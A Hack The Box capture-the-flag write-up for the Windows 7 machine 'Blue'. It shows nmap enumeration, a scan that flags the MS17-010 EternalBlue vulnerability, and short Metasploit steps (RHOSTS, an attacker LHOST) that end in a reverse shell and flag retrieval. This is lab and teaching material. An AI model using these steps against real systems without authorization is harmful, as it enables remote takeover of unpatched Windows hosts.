---
layout: default
title: BLUE
description: by HACK THE BOX
---

<h3 align="center">
Blue is a Windows 7 machine that has a the infamous Eternal Blue vulnerability
</h3>

# Enumeration

1. Nmap

   ```
   └─$ nmap -A -T4 10.10.10.40
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 16:06 EST
   Nmap scan report for 10.10.10.40
   Host is up (0.037s latency).
   Not shown: 991 closed tcp ports (conn-refused)
   PORT      STATE SERVICE      VERSION
   135/tcp   open  msrpc        Microsoft Windows RPC
   139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
   445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
   49152/tcp open  msrpc        Microsoft Windows RPC
   49153/tcp open  msrpc        Microsoft Windows RPC
   49154/tcp open  msrpc        Microsoft Windows RPC
   49155/tcp open  msrpc        Microsoft Windows RPC
   49156/tcp open  msrpc        Microsoft Windows RPC
   49157/tcp open  msrpc        Microsoft Windows RPC
   Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

   Host script results:
   | smb-security-mode:
   |   account_used: guest
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-security-mode:
   |   2.1:
   |_    Message signing enabled but not required
   | smb2-time:
   |   date: 2021-11-27T21:08:26
   |_  start_date: 2021-11-27T21:03:16
   | smb-os-discovery:
   |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
   |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
   |   Computer name: haris-PC
   |   NetBIOS computer name: HARIS-PC\x00
   |   Workgroup: WORKGROUP\x00
   |_  System time: 2021-11-27T21:08:25+00:00
   |_clock-skew: mean: 1m15s, deviation: 1s, median: 1m14s

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 69.53 seconds
   ```

2. Also I tried to scan the machine with NMAP for known vulnerabilities

   ```
   ─$ nmap -T4 10.10.10.40 --script vuln
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 16:08 EST
   Pre-scan script results:
   | broadcast-avahi-dos:
   |   Discovered hosts:
   |     224.0.0.251
   |   After NULL UDP avahi packet DoS (CVE-2011-1002).
   |_  Hosts are all up (not vulnerable).
   Nmap scan report for 10.10.10.40
   Host is up (0.043s latency).
   Not shown: 991 closed tcp ports (conn-refused)
   PORT      STATE SERVICE
   135/tcp   open  msrpc
   139/tcp   open  netbios-ssn
   445/tcp   open  microsoft-ds
   49152/tcp open  unknown
   49153/tcp open  unknown
   49154/tcp open  unknown
   49155/tcp open  unknown
   49156/tcp open  unknown
   49157/tcp open  unknown

   Host script results:
   |_smb-vuln-ms10-054: false
   |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
   | smb-vuln-ms17-010:
   |   VULNERABLE:
   |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
   |     State: VULNERABLE
   |     IDs:  CVE:CVE-2017-0143
   |     Risk factor: HIGH
   |       A critical remote code execution vulnerability exists in Microsoft SMBv1
   |        servers (ms17-010).
   |
   |     Disclosure date: 2017-03-14
   |     References:
   |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
   |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
   |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

   Nmap done: 1 IP address (1 host up) scanned in 135.34 seconds
   ```

3. Found that it might be vulnerable with CVE-2017-0143. Let's read about it in google.

# Foothold

4. So it looks like there is a metasploit exploit for this one. Let's run MSFCONSOLE
5. In metasploit, lets set the following
   - set RHOSTS 10.10.10.40
   - set LHOST <to you tun0 IP>
   - then run the exploit
6. After a few seconds, we got a reverse shell.
7. Root flag is located at C:\Users\Administrator\Desktop\root.txt
8. User flag is located at C:\Users\haris\Desktop\user.txt

# Reference

1. https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0143/
2. https://www.exploit-db.com/exploits/42315

<br><br>

[back to HOME](./)
